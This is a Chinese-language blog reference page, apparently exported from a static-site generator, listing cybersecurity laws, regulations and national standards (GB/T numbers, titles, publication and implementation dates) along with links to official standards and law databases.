网络支付服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=182AA2DDF9F1EB9A69193B9CA528BBC4\">GB&#x2F;T 42017-2022</a></td>\n<td>信息安全技术 网络预约汽车服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=20615352AC128FC97F8005161976B921\">GB&#x2F;T 42016-2022</a></td>\n<td>信息安全技术 网络音视频服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CDBCE8F2E4CDE60A86092361A8796178\">GB&#x2F;T 42013-2022</a></td>\n<td>信息安全技术 快递物流服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=4D3C5BB193E079AD54294E5845749B8F\">GB&#x2F;T 41871-2022</a></td>\n<td>信息安全技术 汽车数据处理安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=1D986D9DCCC518D19DAD9431DD76053E\">GB&#x2F;T 39204-2022</a></td>\n<td>信息安全技术 关键信息基础设施安全保护要求</td>\n<td>2022-10-12</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=5D7C9B95DB5F844C84F2F6C08843E2BB\">GB&#x2F;T 41578-2022</a></td>\n<td>电动汽车充电系统信息安全技术要求及试验方法</td>\n<td>2022-07-11</td>\n<td>2023-02-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=B4272EB52F5930B214910854EFEA4C5F\">GB&#x2F;T 41400-2022</a></td>\n<td>信息安全技术 工业控制系统信息安全防护能力成熟度模型</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=FDA38AB7D08A715C6B6D69DFDEABB2C0\">GB&#x2F;T 20984-2022</a></td>\n<td>信息安全技术 信息安全风险评估方法</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2134DD3D7ED96B383E61C496D6E19D58\">GB&#x2F;T 41574-2022</a></td>\n<td>信息技术 安全技术 公有云中个人信息保护实践指南</td>\n<td>2022-07-11</td>\n<td>2023-02-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12A71EBE05397BE0A0AF33F\">GB&#x2F;T 41387-2022</a></td>\n<td>信息安全技术 智能家居通用安全规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12C71EBE05397BE0A0AF33F\">GB&#x2F;T 41388-2022</a></td>\n<td>信息安全技术 可信执行环境 基本安全规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12E71EBE05397BE0A0AF33F\">GB&#x2F;T 41389-2022</a></td>\n<td>信息安全技术 SM9 密码算法使用规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13071EBE05397BE0A0AF33F\">GB&#x2F;T 41391-2022</a></td>\n<td>信息安全技术 移动互联网应用程序（App）收集个人信息基本要求</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12471EBE05397BE0A0AF33F\">GB&#x2F;T 41479-2022</a></td>\n<td>信息安全技术 网络数据处理安全要求</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C09371EBE05397BE0A0AF33F\">GB&#x2F;T 20984-2022</a></td>\n<td>信息安全技术 信息安全风险评估方法<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D786C1D3A7E05397BE0A0AB82A\">GB&#x2F;T 20984-2007</a> 信息安全技术 信息安全风险评估规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12171EBE05397BE0A0AF33F\">GB&#x2F;T 29829-2022</a></td>\n<td>信息安全技术 可信计算密码支撑平台功能与接口规范<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7E974D3A7E05397BE0A0AB82A\">GB&#x2F;T  29829-2013</a> 信息安全技术 可信计算密码支撑平台功能与接口规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13471EBE05397BE0A0AF33F\">GB&#x2F;T 30283-2022</a></td>\n<td>信息安全技术 信息安全服务 分类与代码<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7EDA9D3A7E05397BE0A0AB82A\">GB&#x2F;T 30283-2013</a> 信息安全技术 信息安全服务 分类</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12B71EBE05397BE0A0AF33F\">GB&#x2F;T 31506-2022</a></td>\n<td>信息安全技术 政务网站系统安全指南<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D804F5D3A7E05397BE0A0AB82A\">GB&#x2F;T 31506-2015</a> 信息安全技术 政府门户网站系统安全技术指南</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=56123482721B1AC3CEDCD3B5C022CAD8\">GB&#x2F;T 25069-2022</a></td>\n<td>信息安全技术 术语</td>\n<td>2022-03-09</td>\n<td>2022-10-01</td>\n</tr>\n<tr>\n<td></td>\n<td><a href=\"http://www.cac.gov.cn/2022-01/04/c_1642894602182845.htm\">网络安全审查办法</a></td>\n<td>2022-01-04</td>\n<td>2022-2-15</td>\n</tr>\n</tbody></table>\n<h3 id=\"2021-年及以前（按体系分类）\"><a href=\"#2021-年及以前（按体系分类）\" class=\"headerlink\" title=\"2021 年及以前（按体系分类）\"></a>2021 年及以前（按体系分类）</h3><h4 id=\"一般性法律规定\"><a href=\"#一般性法律规定\" class=\"headerlink\" title=\"一般性法律规定\"></a>一般性法律规定</h4><ul>\n<li>《中华人民共和国宪法》，法律效力位阶：宪法，施行日期：2018-03-11</li>\n<li>《中华人民共和国国家安全法》，法律效力位阶：法律，施行日期：2015-07-01</li>\n<li>《中华人民共和国治安管理处罚法》，法律效力位阶：法律，施行日期：2013-01-01</li>\n<li>《中华人民共和国保守国家秘密法》，法律效力位阶：法律，施行日期：2010-10-01</li>\n</ul>\n<h4 id=\"规范和惩罚信息网络犯罪的法律\"><a href=\"#规范和惩罚信息网络犯罪的法律\" class=\"headerlink\" title=\"规范和惩罚信息网络犯罪的法律\"></a>规范和惩罚信息网络犯罪的法律</h4><ul>\n<li>《中华人民共和国刑法》，法律效力位阶：法律，施行日期：2021-03-01</li>\n<li>《全国人民代表大会常务委员会关于维护互联网安全的决定》法律效力位阶：有关法律问题和重大问题的决定，施行日期：2000-12-28</li>\n</ul>\n<h4 id=\"直接针对信息安全的特别规定\"><a href=\"#直接针对信息安全的特别规定\" class=\"headerlink\" title=\"直接针对信息安全的特别规定\"></a>直接针对信息安全的特别规定</h4><ul>\n<li>《中华人民共和国网络安全法》，法律效力位阶：法律，施行日期：2017-06-01</li>\n<li>《中华人民共和国计算机信息系统安全保护条例》，法律效力位阶：行政法规，公布日期：2011-01-08</li>\n<li>《中华人民共和国电信条例》，法律效力位阶：行政法规，公布日期：2016-02-06</li>\n<li>《中华人民共和国计算机信息网络国际联网管理暂行规定》，法律效力位阶：行政法规，公布日期：1997-05-20</li>\n<li>《计算机信息网络国际联网安全保护管理办法》，法律效力位阶：行政法规，公布日期：2011-01-08</li>\n</ul>\n<h4 id=\"具体规范信息安全技术、信息安全管理\"><a href=\"#具体规范信息安全技术、信息安全管理\" class=\"headerlink\" title=\"具体规范信息安全技术、信息安全管理\"></a>具体规范信息安全技术、信息安全管理</h4><ul>\n<li>《中华人民共和国电子签名法》，法律效力位阶：法律，施行日期：2019-04-23</li>\n<li>《计算机软件保护条例》，法律效力位阶：行政法规，公布日期：2013-01-30</li>\n<li>《商用密码管理条例》，法律效力位阶：行政法规，公布日期：1999-10-07</li>\n<li>《中华人民共和国保守国家秘密法实施条例》，法律效力位阶：行政法规，公布日期：2014-01-17</li>\n<li>GB&#x2F;T 37090-2018《信息安全技术 病毒防治产品安全技术要求和测试评价方法》，施行日期：2019-07-01</li>\n<li>《计算机信息系统国际联网保密管理规定》，颁布单位：国家保密局，施行日期：2000-01-01</li>\n<li>《金融机构计算机信息系统安全保护工作暂行规定》，颁布单位：公安部，颁布时间：1998-08-31</li>\n</ul>\n<h2 id=\"关键词\"><a href=\"#关键词\" class=\"headerlink\" title=\"关键词\"></a>关键词</h2><h3 id=\"安全等级保护\"><a href=\"#安全等级保护\" class=\"headerlink\" title=\"安全等级保护\"></a>安全等级保护</h3><ul>\n<li>GB&#x2F;T 22240-2020，《信息安全技术 网络安全等级保护定级指南》，发布日期：2020-04-28，2020-11-01</li>\n<li>GB&#x2F;T 25058-2019，《信息安全技术 网络安全等级保护实施指南》，发布日期：2019-08-30，2020-03-01</li>\n<li>GB&#x2F;T 25070-2019，《信息安全技术 网络安全等级保护安全设计技术要求》，发布日期：2019-05-10，2019-12-01</li>\n<li>GB&#x2F;T 22239-2019，《信息安全技术 网络安全等级保护基本要求》，发布日期：2019-05-10，2019-12-01</li>\n<li>GB&#x2F;T 28448-2019，《信息安全技术 网络安全等级保护测评要求》，发布日期：2019-05-10，2019-12-01</li>\n<li>GB&#x2F;T 28449-2018，《信息安全技术 网络安全等级保护测评过程指南》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 36958-2018，《信息安全技术 网络安全等级保护安全管理中心技术要求》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 36959-2018，《信息安全技术 网络安全等级保护测评机构能力要求和评估规范》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 37138-2018，《电力信息系统安全等级保护实施指南》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 36627-2018，《信息安全技术 网络安全等级保护测试评估技术指南》，发布日期：2018-09-17，2019-04-01</li>\n<li>GB&#x2F;T 35317-2017，《公安物联网系统信息安全等级保护要求》，发布日期：2017-12-29，2017-12-29</li>\n</ul>\n<h3 id=\"数据安全\"><a href=\"#数据安全\" class=\"headerlink\" title=\"数据安全\"></a>数据安全</h3><ul>\n<li>GB&#x2F;T 43739-2024《数据安全技术 应用商店的移动互联网应用程序（App）个人信息处理规范性审核与管理指南》，发布日期：2024-04-25，实施日期：2024-11-01</li>\n<li>GB&#x2F;T 43697-2024《数据安全技术 数据分类分级规则》，发布日期：2024-03-15，实施日期：2024-10-01</li>\n<li>GB&#x2F;T 42775-2023《证券期货业数据安全风险防控 数据分类分级指引》，发布日期：2023-08-06，实施日期：2023-08-06</li>\n<li>GB&#x2F;T 35274-2023《数据安全技术 大数据服务安全能力要求》，发布日期：2023-08-06，实施日期：2024-03-01</li>\n<li>GB&#x2F;T 42447-2023《信息安全技术 电信领域数据安全指南》，发布日期：2023-03-17，实施日期：2023-10-01</li>\n<li>GB&#x2F;T 41819-2022《信息安全技术 人脸识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 41806-2022《信息安全技术 基因识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 41773-2022《信息安全技术 步态识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 41807-2022《信息安全技术 声纹识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42014-2022《信息安全技术 网上购物服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42012-2022《信息安全技术 即时通信服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42015-2022《信息安全技术 网络支付服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42017-2022《信息安全技术 网络预约汽车服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42016-2022《信息安全技术 网络音视频服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42013-2022《信息安全技术 快递物流服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 39725-2020《信息安全技术 健康医疗数据安全指南》，发布日期：2020-12-14，实施日期：2021-07-01</li>\n<li>GB&#x2F;T 39477-2020《信息安全技术 政务信息共享 数据安全技术要求》，发布日期：2020-11-19，实施日期：2021-06-01</li>\n<li>GB&#x2F;T 37973-2019《信息安全技术 大数据安全管理指南》，发布日期：2019-08-30，实施日期：2020-03-01</li>\n<li>GB&#x2F;T 37988-2019《信息安全技术 数据安全能力成熟度模型》，发布日期：2019-08-30，实施日期：2020-03-01</li>\n<li>GB&#x2F;T 37373-2019《智能交通 数据安全服务》，发布日期：2019-05-10，实施日期：2019-12-01</li>\n</ul>\n<h3 id=\"开源软件\"><a href=\"#开源软件\" class=\"headerlink\" title=\"开源软件\"></a>开源软件</h3><ul>\n<li>GB&#x2F;T 42927-2023《金融行业开源软件测评规范》，发布日期：2023-08-06，实施日期：2023-08-06</li>\n</ul>\n<h3 id=\"信创\"><a href=\"#信创\" class=\"headerlink\" title=\"信创\"></a>信创</h3><ul>\n<li>网络关键设备和网络安全专用产品安全认证和安全检测结果检索，发布日期：2024-06-28（共 3286 项，符合标准 GB 42250-2022 等）</li>\n<li>《网络关键设备和网络安全专用产品目录》，发布日期：2023-07-03</li>\n</ul>\n","cover":false,"excerpt":"","more":"<h1 id=\"SmallHao免责声明\"><a href=\"#SmallHao免责声明\" class=\"headerlink\" title=\"SmallHao免责声明\"></a>SmallHao免责声明</h1><p><strong>【免责声明】本博客所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本博客无关。</strong></p>\n<p>一个网络安全法律法规、安全政策、国家标准、行业标准知识库。</p>\n<h2 id=\"资源导航\"><a href=\"#资源导航\" class=\"headerlink\" title=\"资源导航\"></a>资源导航</h2><ul>\n<li>公安部公布打击黑客犯罪 10 起典型案例：<a href=\"https://mp.weixin.qq.com/s/vKqjc1uTajClu7bsn9yfLA\">https://mp.weixin.qq.com/s/vKqjc1uTajClu7bsn9yfLA</a></li>\n<li>公安部公布“百日行动”期间打击网络违法犯罪十大典型案例：<a href=\"https://news.cctv.com/2022/09/08/ARTIQLE0cQRPbqjPxAsOeUFe220908.shtml\">https://news.cctv.com/2022/09/08/ARTIQLE0cQRPbqjPxAsOeUFe220908.shtml</a></li>\n<li>国家标准全文公开系统：<a href=\"http://openstd.samr.gov.cn/bzgk/gb/index\">http://openstd.samr.gov.cn/bzgk/gb/index</a></li>\n<li>国家法律法规数据库：<a href=\"https://flk.npc.gov.cn/index.html\">https://flk.npc.gov.cn/index.html</a></li>\n<li>全国标准信息公共服务平台：<a href=\"http://std.samr.gov.cn/\">http://std.samr.gov.cn/</a></li>\n<li>自 2017 年 1 月 1 日后新发布的标准将在发布后 20 个工作日内公开</li>\n<li>国家互联网信息办公室 ：<a href=\"http://www.cac.gov.cn/\">http://www.cac.gov.cn/</a></li>\n</ul>\n<h2 id=\"法律法规\"><a href=\"#法律法规\" class=\"headerlink\" title=\"法律法规\"></a>法律法规</h2><h3 id=\"常见标准代号\"><a href=\"#常见标准代号\" class=\"headerlink\" title=\"常见标准代号\"></a>常见标准代号</h3><ul>\n<li>强制性国家标准代号 GB</li>\n<li>推荐性国家标准代号 GB&#x2F;T</li>\n<li>指导性技术文件代号 GB&#x2F;Z</li>\n<li>实物标准代号 GSB</li>\n</ul>\n<h3 id=\"2024-年新发布\"><a href=\"#2024-年新发布\" class=\"headerlink\" title=\"2024 年新发布\"></a>2024 年新发布</h3><table>\n<thead>\n<tr>\n<th>标准号</th>\n<th>标准名称</th>\n<th>发布日期</th>\n<th>实施日期</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GB&#x2F;T 44810.2-2024</td>\n<td>IPv6 网络安全设备技术要求 第 2 部分：Web 应用防护系统（WAF）</td>\n<td>2024-10-26</td>\n<td>2025-02-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44810.1-2024</td>\n<td>IPv6 网络安全设备技术要求 第 1 部分：防火墙</td>\n<td>2024-10-26</td>\n<td>2025-02-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44810.3-2024</td>\n<td>IPv6 网络安全设备技术要求 第 3 部分：入侵防御系统（IPS）</td>\n<td>2024-10-26</td>\n<td>2025-02-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44862-2024</td>\n<td>网络安全技术 网络弹性评价准则</td>\n<td>2024-10-26</td>\n<td>2025-05-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31500-2024</td>\n<td>网络安全技术 存储介质数据恢复服务安全规范</td>\n<td>2024-10-26</td>\n<td>2025-05-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44778-2024</td>\n<td>汽车诊断接口信息安全技术要求及试验方法</td>\n<td>2024-10-26</td>\n<td>2024-10-26</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44774-2024</td>\n<td>汽车信息安全应急响应管理规范</td>\n<td>2024-10-26</td>\n<td>2024-10-26</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44602-2024</td>\n<td>网络安全技术 智能门锁网络安全技术规范</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44462.2-2024</td>\n<td>工业互联网企业网络安全 第 2 部分：平台企业防护要求</td>\n<td>2024-09-29</td>\n<td>2025-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44462.3-2024</td>\n<td>工业互联网企业网络安全 第 3 部分：标识解析企业防护要求</td>\n<td>2024-09-29</td>\n<td>2025-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44462.1-2024</td>\n<td>工业互联网企业网络安全 第 1 部分：应用工业互联网的工业企业防护要求</td>\n<td>2024-09-29</td>\n<td>2025-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 15852.2-2024</td>\n<td>网络安全技术 消息鉴别码 第 2 部分：采用专门设计的杂凑函数的机制</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 29244-2024</td>\n<td>网络安全技术 办公设备安全规范</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20279-2024</td>\n<td>网络安全技术 网络和终端隔离产品技术规范</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 22081-2024</td>\n<td>网络安全技术 信息安全控制</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 15843.2-2024</td>\n<td>网络安全技术 实体鉴别 第 2 部分：采用鉴别式加密的机制</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18238.1-2024</td>\n<td>网络安全技术 杂凑函数 第 1 部分：总则</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18238.2-2024</td>\n<td>网络安全技术 杂凑函数 第 2 部分：采用分组密码的杂凑函数</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18238.3-2024</td>\n<td>网络安全技术 杂凑函数 第 3 部分：专门设计的杂凑函数</td>\n<td>2024-09-29</td>\n<td>2025-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 44585.1-2024</td>\n<td>风险管理在接入 IT 网络的医疗器械中的应用 第 1 部分：联网医疗器械或健康软件在其实施和使用中的安全、有效性和网络安全</td>\n<td>2024-09-29</td>\n<td>2026-04-01</td>\n</tr>\n<tr>\n<td>GB 44495-2024</td>\n<td>汽车整车信息安全技术要求</td>\n<td>2024-08-23</td>\n<td>2026-01-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43848-2024</td>\n<td>网络安全技术 软件产品开源代码安全评价方法</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43779-2024</td>\n<td>网络安全技术 基于密码令牌的主叫用户可信身份鉴别技术规范</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43741-2024</td>\n<td>网络安全技术 网络安全众测服务要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43698-2024</td>\n<td>网络安全技术 软件供应链安全要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43696-2024</td>\n<td>网络安全技术 零信任参考体系架构</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43694-2024</td>\n<td>网络安全技术 证书应用综合服务接口规范</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 33565-2024</td>\n<td>网络安全技术 无线局域网接入系统安全技术要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 33563-2024</td>\n<td>网络安全技术 无线局域网客户端安全技术要求</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 30270-2024</td>\n<td>网络安全技术 信息技术安全评估方法</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.5-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 5 部分：预定义的安全要求包</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.4-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 4 部分：评估方法和活动的规范框架</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.3-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 3 部分：安全保障组件</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.2-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 2 部分：安全功能组件</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 18336.1-2024</td>\n<td>网络安全技术 信息技术安全评估准则 第 1 部分：简介和一般模型</td>\n<td>2024-04-25</td>\n<td>2024-11-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 17903.3-2024</td>\n<td>网络安全技术 抗抵赖 第 3 部分：用非对称技术的机制</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31497-2024</td>\n<td>网络安全技术 信息安全管理 监视、测量、分析和评价</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 17903.1-2024</td>\n<td>网络安全技术 抗抵赖 第 1 部分：概述</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 15843.4-2024</td>\n<td>网络安全技术 实体鉴别 第 4 部分：用密码校验函数的机制</td>\n<td>2024-03-15</td>\n<td>2024-10-01</td>\n</tr>\n</tbody></table>\n<h3 id=\"2023-年新发布\"><a href=\"#2023-年新发布\" class=\"headerlink\" title=\"2023 年新发布\"></a>2023 年新发布</h3><table>\n<thead>\n<tr>\n<th>标准号</th>\n<th>标准名称</th>\n<th>发布日期</th>\n<th>实施日期</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>GB&#x2F;T 43578-2023</td>\n<td>信息安全技术 通用密码服务接口规范</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43577.1-2023</td>\n<td>信息安全技术 电子发现 第 1 部分：概述和概念</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 35290-2023</td>\n<td>信息安全技术 射频识别（RFID）系统安全技术规范</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43557-2023</td>\n<td>信息安全技术 网络安全信息报送指南</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 29246-2023</td>\n<td>信息安全技术 信息安全管理体系 概述和词汇</td>\n<td>2023-12-28</td>\n<td>2024-07-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43532-2023</td>\n<td>核电厂仪表和控制系统网络安全防范管控</td>\n<td>2023-12-28</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43269-2023</td>\n<td>信息安全技术 网络安全应急能力评估准则</td>\n<td>2023-11-27</td>\n<td>2024-06-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43435-2023</td>\n<td>信息安全技术 移动互联网应用程序（App）软件开发工具包（SDK）安全要求</td>\n<td>2023-11-27</td>\n<td>2024-06-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43445-2023</td>\n<td>信息安全技术 移动智能终端预置应用软件基本安全要求</td>\n<td>2023-11-27</td>\n<td>2024-06-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43026-2023</td>\n<td>公共安全视频监控联网信息安全测试规范</td>\n<td>2023-09-07</td>\n<td>2024-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42971-2023</td>\n<td>第三方电子合同服务平台信息安全技术要求</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43046-2023</td>\n<td>信息技术服务 应对突发公共安全事件的信息技术应急风险管理</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43207-2023</td>\n<td>信息安全技术 信息系统密码应用设计指南</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 43206-2023</td>\n<td>信息安全技术 信息系统密码应用测评要求</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32916-2023</td>\n<td>信息安全技术 信息安全控制评估指南</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32914-2023</td>\n<td>信息安全技术 网络安全服务能力要求</td>\n<td>2023-09-07</td>\n<td>2024-04-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42884-2023</td>\n<td>信息安全技术 移动互联网应用程序（App）生命周期安全管理指南</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42888-2023</td>\n<td>信息安全技术 机器学习算法安全评估规范</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 35274-2023</td>\n<td>信息安全技术 大数据服务安全能力要求</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;Z 42885-2023</td>\n<td>信息安全技术 网络安全信息共享指南</td>\n<td>2023-08-06</td>\n<td>2024-03-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42926-2023</td>\n<td>金融信息系统网络安全风险评估规范</td>\n<td>2023-08-06</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42708-2023</td>\n<td>金融网络安全威胁信息共享指南</td>\n<td>2023-08-06</td>\n<td>2023-08-06</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42589-2023</td>\n<td>信息安全技术 电子凭据服务安全规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 24364-2023</td>\n<td>信息安全技术 信息安全风险管理实施指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31168-2023</td>\n<td>信息安全技术 